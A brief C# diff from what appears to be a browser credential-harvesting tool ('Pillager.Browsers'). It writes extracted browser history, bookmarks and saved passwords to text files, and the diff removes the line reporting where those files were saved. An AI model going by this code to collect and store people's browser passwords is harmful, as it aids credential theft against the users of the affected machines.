@@ -301,7 +301,6 @@ namespace Pillager.Browsers
             if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
             if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
             if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
-            Console.WriteLine("Files wrote to " + savepath);
         }
     }
 }
